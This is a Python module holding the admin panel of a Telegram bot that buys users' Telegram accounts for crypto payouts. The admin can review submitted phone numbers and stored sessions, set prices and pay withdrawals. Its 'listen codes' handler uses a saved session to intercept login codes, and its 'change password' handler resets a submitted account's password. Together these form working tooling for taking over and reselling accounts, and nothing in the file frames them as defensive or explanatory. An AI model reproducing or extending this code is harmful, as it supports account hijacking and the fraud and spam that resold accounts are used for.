import logging
import asyncio
from aiogram import Router, F, Bot
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

import database as db
import keyboards as kb
from config import ADMIN_ID, CRYPTO_CURRENCY, PRICE_PER_ACCOUNT
from services.cryptobot import create_invoice
from services.telegram_auth import change_password, listen_for_codes

logger = logging.getLogger(__name__)
router = Router()


def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID


class AdminStates(StatesGroup):
    waiting_new_password = State()
    waiting_pay_check = State()
    waiting_new_price = State()


# ========== ADMIN COMMAND ==========

async def _admin_panel_text() -> str:
    stats = await db.get_bot_stats()
    price = await db.get_price()
    return (
        f"🔧 <b>Панель администратора</b>\n\n"
        f"👥 Пользователей: <b>{stats['total_users']}</b>\n"
        f"📱 Аккаунтов всего: <b>{stats['total_accounts']}</b>\n"
        f"✅ Принято: <b>{stats['approved_accounts']}</b>\n"
        f"⏳ На проверке: <b>{stats['pending_accounts']}</b>\n"
        f"💸 Ожидают выплаты: <b>{stats['pending_withdrawals']}</b>\n"
        f"💰 Баланс юзеров: <b>{stats['total_balance']:.2f} {CRYPTO_CURRENCY}</b>\n\n"
        f"💵 Текущий прайс: <b>{price} {CRYPTO_CURRENCY}</b>"
    )


@router.message(Command("admin"))
async def admin_cmd(message: Message):
    if not is_admin(message.from_user.id):
        return
    await message.answer(
        await _admin_panel_text(),
        reply_markup=kb.admin_menu(),
        parse_mode="HTML"
    )


@router.callback_query(F.data == "admin_menu")
async def admin_menu_cb(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.clear()
    await callback.message.edit_text(
        await _admin_panel_text(),
        reply_markup=kb.admin_menu(),
        parse_mode="HTML"
    )


# ========== STATS ==========

@router.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    stats = await db.get_bot_stats()
    await callback.message.edit_text(
        f"📊 <b>Подробная статистика</b>\n\n"
        f"👥 Пользователей: <b>{stats['total_users']}</b>\n"
        f"📱 Аккаунтов всего: <b>{stats['total_accounts']}</b>\n"
        f"✅ Принято: <b>{stats['approved_accounts']}</b>\n"
        f"⏳ На проверке: <b>{stats['pending_accounts']}</b>\n"
        f"💸 Заявок на вывод: <b>{stats['pending_withdrawals']}</b>\n"
        f"💰 Баланс всех юзеров: <b>{stats['total_balance']:.2f} {CRYPTO_CURRENCY}</b>",
        reply_markup=kb.admin_back(),
        parse_mode="HTML"
    )


# ========== SET PRICE ==========

@router.callback_query(F.data == "admin_set_price")
async def admin_set_price_start(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    current_price = await db.get_price()
    await state.set_state(AdminStates.waiting_new_price)
    await callback.message.edit_text(
        f"💰 <b>Изменение прайса</b>\n\n"
        f"Текущая цена: <b>{current_price} {CRYPTO_CURRENCY}</b>\n\n"
        f"Введи новую цену за аккаунт (число):",
        reply_markup=kb.cancel_admin_kb(),
        parse_mode="HTML"
    )


@router.message(AdminStates.waiting_new_price)
async def admin_set_price_execute(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        new_price = float(message.text.replace(",", "."))
        if new_price <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Введи корректное число больше 0.", reply_markup=kb.cancel_admin_kb())
        return

    await db.set_price(new_price)
    await state.clear()
    await message.answer(
        f"✅ Цена обновлена: <b>{new_price} {CRYPTO_CURRENCY}</b>",
        reply_markup=kb.admin_menu(),
        parse_mode="HTML"
    )


# ========== USERS ==========

@router.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    users = await db.get_all_users()
    if not users:
        await callback.message.edit_text("👥 Пользователей нет.", reply_markup=kb.admin_back())
        return

    text = "👥 <b>Все пользователи:</b>\n\n"
    for u in users[:20]:
        # (user_id, username, full_name, balance, total_submitted, total_earned, registered_at)
        name = u[2] or u[1] or "Без имени"
        text += (
            f"👤 <b>{name}</b> (@{u[1] or '—'})\n"
            f"   🆔 <code>{u[0]}</code> | 📱 {u[4]} шт | 💰 {u[3]:.2f} {CRYPTO_CURRENCY}\n\n"
        )

    if len(users) > 20:
        text += f"... и ещё {len(users) - 20} пользователей"

    await callback.message.edit_text(text, reply_markup=kb.admin_back(), parse_mode="HTML")


# ========== ACCOUNTS ==========

@router.callback_query(F.data == "admin_accounts")
async def admin_accounts(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    accounts = await db.get_all_accounts()
    if not accounts:
        await callback.message.edit_text("📱 Аккаунтов нет.", reply_markup=kb.admin_back())
        return

    status_map = {
        'pending': '⏳',
        'approved': '✅',
        'rejected': '❌',
        'processing': '🔄',
    }

    text = "📱 <b>Все аккаунты (последние 15):</b>\n\n"
    for acc in accounts[:15]:
        # (id, user_id, phone, status, session_data, submitted_at, price, username, full_name)
        icon = status_map.get(acc[3], '❓')
        name = acc[8] or acc[7] or "—"
        date = acc[5][:10] if acc[5] else "—"
        text += (
            f"{icon} #{acc[0]} <code>{acc[2]}</code>\n"
            f"   👤 {name} | 📅 {date}\n\n"
        )

    # Кнопки для выбора аккаунта
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    buttons = []
    for acc in accounts[:10]:
        icon = status_map.get(acc[3], '❓')
        buttons.append([InlineKeyboardButton(
            text=f"{icon} #{acc[0]} {acc[2]}",
            callback_data=f"admin_acc_{acc[0]}"
        )])
    buttons.append([InlineKeyboardButton(text="🔙 Меню", callback_data="admin_menu")])
    markup = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.edit_text(text, reply_markup=markup, parse_mode="HTML")


@router.callback_query(F.data.startswith("admin_acc_"))
async def admin_account_detail(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    account_id = int(callback.data.split("_")[2])
    acc = await db.get_account(account_id)
    if not acc:
        await callback.answer("Аккаунт не найден", show_alert=True)
        return

    status_map = {'pending': '⏳ Ожидает', 'approved': '✅ Принят', 'rejected': '❌ Отклонён'}
    has_session = "✅ Есть" if acc[4] else "❌ Нет"

    await callback.message.edit_text(
        f"📱 <b>Аккаунт #{account_id}</b>\n\n"
        f"📞 Номер: <code>{acc[2]}</code>\n"
        f"📊 Статус: {status_map.get(acc[3], acc[3])}\n"
        f"💾 Сессия: {has_session}\n"
        f"💰 Выплата: {acc[6]} {CRYPTO_CURRENCY}\n"
        f"📅 Сдан: {acc[5][:16] if acc[5] else '—'}",
        reply_markup=kb.admin_account_actions(account_id, acc[2]),
        parse_mode="HTML"
    )


# ========== APPROVE / REJECT ACCOUNT ==========

@router.callback_query(F.data.startswith("admin_approve_"))
async def admin_approve_account(callback: CallbackQuery, bot: Bot):
    if not is_admin(callback.from_user.id):
        return
    account_id = int(callback.data.split("_")[2])
    acc = await db.get_account(account_id)
    if not acc:
        await callback.answer("Аккаунт не найден", show_alert=True)
        return

    await db.update_account_status(account_id, 'approved')
    await callback.answer("✅ Аккаунт одобрен, баланс начислен", show_alert=True)

    # Уведомляем пользователя
    try:
        await bot.send_message(
            acc[1],
            f"✅ <b>Ваш аккаунт принят!</b>\n\n"
            f"📞 Номер: <code>{acc[2]}</code>\n"
            f"💰 Начислено: <b>{acc[6]} {CRYPTO_CURRENCY}</b>",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Не удалось уведомить пользователя: {e}")

    await callback.message.edit_text(
        f"✅ Аккаунт #{account_id} одобрен.",
        reply_markup=kb.admin_back()
    )


@router.callback_query(F.data.startswith("admin_reject_") & ~F.data.startswith("admin_reject_w_"))
async def admin_reject_account(callback: CallbackQuery, bot: Bot):
    if not is_admin(callback.from_user.id):
        return
    account_id = int(callback.data.split("_")[2])
    acc = await db.get_account(account_id)

    await db.update_account_status(account_id, 'rejected')
    await callback.answer("❌ Аккаунт отклонён", show_alert=True)

    if acc:
        try:
            await bot.send_message(
                acc[1],
                f"❌ <b>Аккаунт отклонён</b>\n\n"
                f"📞 Номер: <code>{acc[2]}</code>\n"
                f"Свяжись с поддержкой для уточнения причины.",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Не удалось уведомить пользователя: {e}")

    await callback.message.edit_text(
        f"❌ Аккаунт #{account_id} отклонён.",
        reply_markup=kb.admin_back()
    )


# ========== LISTEN CODES ==========

@router.callback_query(F.data.startswith("admin_listen_"))
async def admin_listen_codes(callback: CallbackQuery, bot: Bot):
    if not is_admin(callback.from_user.id):
        return
    account_id = int(callback.data.split("_")[2])
    acc = await db.get_account(account_id)
    if not acc or not acc[4]:
        await callback.answer("❌ Нет сохранённой сессии для этого аккаунта", show_alert=True)
        return

    await callback.answer("⏳ Слушаю коды 2 минуты...", show_alert=True)
    await callback.message.answer(
        f"🔑 Начинаю слушать коды для <code>{acc[2]}</code>...\n"
        f"⏱ Ожидание: 2 минуты",
        parse_mode="HTML"
    )

    # Запускаем прослушку в фоне
    asyncio.create_task(
        listen_for_codes(acc[4], acc[2], ADMIN_ID, bot, duration=120)
    )


# ========== CHANGE PASSWORD ==========

@router.callback_query(F.data.startswith("admin_chpass_"))
async def admin_change_password_start(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    account_id = int(callback.data.split("_")[2])
    acc = await db.get_account(account_id)
    if not acc or not acc[4]:
        await callback.answer("❌ Нет сохранённой сессии", show_alert=True)
        return

    await state.set_state(AdminStates.waiting_new_password)
    await state.update_data(account_id=account_id, session=acc[4], phone=acc[2])
    await callback.message.answer(
        f"🔒 Смена пароля для <code>{acc[2]}</code>\n\n"
        f"Введи новый пароль:",
        parse_mode="HTML",
        reply_markup=kb.cancel_kb()
    )


@router.message(AdminStates.waiting_new_password)
async def admin_change_password_execute(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    new_password = message.text.strip()
    data = await state.get_data()

    result = await change_password(data["session"], data["phone"], new_password)

    if result["success"]:
        await message.answer(
            f"✅ Пароль для <code>{data['phone']}</code> изменён!",
            parse_mode="HTML",
            reply_markup=kb.admin_back()
        )
    else:
        await message.answer(
            f"❌ Ошибка: {result['error']}",
            reply_markup=kb.admin_back()
        )
    await state.clear()


# ========== WITHDRAWALS ==========

@router.callback_query(F.data == "admin_withdrawals")
async def admin_withdrawals(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    withdrawals = await db.get_pending_withdrawals()
    if not withdrawals:
        await callback.message.edit_text(
            "💸 Нет заявок на выплату.",
            reply_markup=kb.admin_back()
        )
        return

    text = "💸 <b>Заявки на выплату:</b>\n\n"
    for w in withdrawals:
        # (id, user_id, amount, crypto_check, status, created_at, processed_at, username, full_name)
        name = w[8] or w[7] or "—"
        date = w[5][:10] if w[5] else "—"
        text += (
            f"#{w[0]} | {name} (@{w[7] or '—'})\n"
            f"   💰 {w[2]:.2f} {CRYPTO_CURRENCY} | 📅 {date}\n\n"
        )

    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    buttons = []
    for w in withdrawals[:10]:
        buttons.append([InlineKeyboardButton(
            text=f"#{w[0]} — {w[2]:.2f} {CRYPTO_CURRENCY}",
            callback_data=f"admin_w_{w[0]}"
        )])
    buttons.append([InlineKeyboardButton(text="🔙 Меню", callback_data="admin_menu")])
    markup = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.edit_text(text, reply_markup=markup, parse_mode="HTML")


@router.callback_query(F.data.startswith("admin_w_"))
async def admin_withdrawal_detail(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    withdrawal_id = int(callback.data.split("_")[2])
    withdrawals = await db.get_pending_withdrawals()
    w = next((x for x in withdrawals if x[0] == withdrawal_id), None)
    if not w:
        await callback.answer("Заявка не найдена", show_alert=True)
        return

    name = w[8] or w[7] or "—"
    await callback.message.edit_text(
        f"💸 <b>Заявка #{withdrawal_id}</b>\n\n"
        f"👤 {name} (@{w[7] or '—'})\n"
        f"🆔 <code>{w[1]}</code>\n"
        f"💰 Сумма: <b>{w[2]:.2f} {CRYPTO_CURRENCY}</b>\n"
        f"📅 Создана: {w[5][:16] if w[5] else '—'}",
        reply_markup=kb.admin_withdrawal_actions(withdrawal_id),
        parse_mode="HTML"
    )


@router.callback_query(F.data.startswith("admin_pay_"))
async def admin_pay_withdrawal(callback: CallbackQuery, bot: Bot):
    if not is_admin(callback.from_user.id):
        return
    withdrawal_id = int(callback.data.split("_")[2])
    withdrawals = await db.get_pending_withdrawals()
    w = next((x for x in withdrawals if x[0] == withdrawal_id), None)
    if not w:
        await callback.answer("Заявка не найдена", show_alert=True)
        return

    await callback.answer("⏳ Создаю чек в CryptoBot...", show_alert=True)

    # Создаём чек в CryptoBot
    result = await create_invoice(w[2], CRYPTO_CURRENCY)

    if not result["success"]:
        await callback.message.answer(f"❌ Ошибка CryptoBot: {result['error']}")
        return

    check_url = result["pay_url"]
    await db.update_withdrawal(withdrawal_id, 'completed', check_url)

    # Отправляем чек пользователю
    try:
        await bot.send_message(
            w[1],
            f"✅ <b>Выплата #{withdrawal_id} обработана!</b>\n\n"
            f"💰 Сумма: <b>{w[2]:.2f} {CRYPTO_CURRENCY}</b>\n\n"
            f"🎁 Получи чек: {check_url}",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Не удалось отправить чек пользователю: {e}")

    await callback.message.edit_text(
        f"✅ Выплата #{withdrawal_id} выполнена!\nЧек отправлен пользователю.",
        reply_markup=kb.admin_back()
    )


@router.callback_query(F.data.startswith("admin_reject_w_"))
async def admin_reject_withdrawal(callback: CallbackQuery, bot: Bot):
    if not is_admin(callback.from_user.id):
        return
    withdrawal_id = int(callback.data.split("_")[3])
    withdrawals = await db.get_pending_withdrawals()
    w = next((x for x in withdrawals if x[0] == withdrawal_id), None)

    if w:
        # Возвращаем баланс
        await db.update_user_balance(w[1], w[2])
        await db.update_withdrawal(withdrawal_id, 'rejected')
        try:
            await bot.send_message(
                w[1],
                f"❌ Заявка на вывод #{withdrawal_id} отклонена.\n"
                f"💰 {w[2]:.2f} {CRYPTO_CURRENCY} возвращено на баланс.",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Ошибка уведомления: {e}")

    await callback.message.edit_text(
        f"❌ Заявка #{withdrawal_id} отклонена, баланс возвращён.",
        reply_markup=kb.admin_back()
    )
